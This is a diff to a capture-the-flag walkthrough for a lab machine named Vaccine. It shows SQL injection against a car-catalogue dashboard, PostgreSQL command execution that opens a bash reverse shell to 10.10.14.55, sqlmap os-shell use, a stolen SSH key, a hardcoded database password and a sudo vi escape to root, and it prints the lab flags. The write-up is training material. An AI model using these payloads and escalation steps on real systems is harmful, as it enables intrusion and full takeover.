@@ -114,7 +114,7 @@ There we have it! The password is `qwerty789`
 
 ## Further Examine Port 80 - Login Page
 
-Using the credentials `admin:qerty789` we can successfully login and get access to the MegaCorp Car Catalogue (/dashboard.php).
+Using the credentials `admin:qwerty789` we can successfully login and get access to the MegaCorp Car Catalogue (/dashboard.php).
 
 ![](pics/megacorp_car_catalogue.png)
 
@@ -142,7 +142,7 @@ By inserting a single `'`character into the search field and pressing enter, we 
     - `' UNION SELECT NULL, NULL, NULL, 'a', NULL --` : VALID
     - `' UNION SELECT NULL, NULL, NULL , NULL, 'a' --` : VALID
 
-    From this, we knw that we can extract valuable information when modifying index 1-4 of the UNION query.
+    From this, we know that we can extract valuable information in form of strings when modifying index 1-4 of the UNION query.
 
 3) Extract valuable information (table names etc)
 
@@ -151,17 +151,92 @@ By inserting a single `'`character into the search field and pressing enter, we 
     - Version: `' UNION SELECT NULL, NULL, NULL , NULL, VERSION() --`: PostgreSQL 11.5 (Ubuntu 11.5-1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.1.0-9ubuntu2) 9.1.0, 64-bit
     - Table names: `' UNION SELECT NULL, table_schema, table_name, NULL, NULL FROM information_schema.tables --`
 
+4) Executing Arbitrary Commands via SQL Injection in PostgreSQL
 
-This all could be have been done automatically by using `sqlmap`, but for the sake of learning: keep doing it manually!
+    According to [this article](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5), all versions of PostgreSQL from 9.3, are vulnerable to this kind of arbitrary command execution (CVE-2019-9193
+    ```
+    '; CREATE TABLE cmd_exec(cmd_output text); --
+
+    '; COPY cmd_exec FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/10.10.14.55/4444 0>&1'''; -- 
+
+    (if output is needed)
+    '; SELECT * FROM cmd_exec; -- (make sure the column number is correct)
+    ```
+
+5) PROFIT
+
+![](pics/reverse_shell.png)
+
+We now have access to the server!
+
+Btw, this all could be have also been done automatically by using `sqlmap`, but for the sake of learning: keep doing it manually!
 
 ```
-sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=vmnafl0uct1r97s1k5bkpoiopg" --dump-all --tamper=space2comment
+$ sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=vmnafl0uct1r97s1k5bkpoiopg" --dump-all --tamper=space2comment
 
 and 
 
-sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=vmnafl0uct1r97s1k5bkpoiopg" --os-shell
+$ sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=vmnafl0uct1r97s1k5bkpoiopg" --os-shell
 ```
 
 ## Exploitation
 
-## Post Exploitation
+In the homedirectory of our current user (/var/lib/postgresql), we can find a file called `user.txt`. It contains the user flag for the machine: `139d3e5c3db18073d250ce0dccc43997`.
+Furthermore, the directory also contains the the `.ssh` directory, in which the private and public SSH key of the user are located. We can use them to stablize our current connection.
+
+```
+$ chmod 600 ssh_key
+
+$ ssh -i postgres_sshkey postgres@10.10.10.46
+```
+
+In the `/var/www/html` directory, we can also find the source code for the `dashboard.php`. Let's take a look on the SQL query, that was vulnerable.
+
+``` php
+ $q = "Select * from cars where name ilike '%". $_REQUEST["search"] ."%'";
+```
+
+So it's basically just appending our user input to the SQL query, which is, as seen, a very bad idea. There must be some security measurements in place, such as user-input validation.
+
+Furthermore, we can also see the credentials of our current user `postgres`:
+
+```php
+$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");   
+```
+
+Having that, we can now check the sudoers list to see if our current user can execute a binary with sudo privileges:
+
+```
+postgres@vaccine:/var/www/html$ sudo -l
+[sudo] password for postgres: 
+Matching Defaults entries for postgres on vaccine:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User postgres may run the following commands on vaccine:
+    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+```
+
+Indeed! We can execute `/bin/vi` on a specific file with sudo privileges. However, we can also start a shell from within `vi`and escape this restriction.
+
+We execute:
+```
+sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+```
+Once, we are in the file editor, we press ESC and type:
+
+```
+:!/bin/sh 
+
+or
+
+:shell
+```
+
+Now we have full root access:
+
+```
+root@vaccine:/var/www/html# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+The root.txt is: `dd6e058e814260bc70e9bbdef2715849`
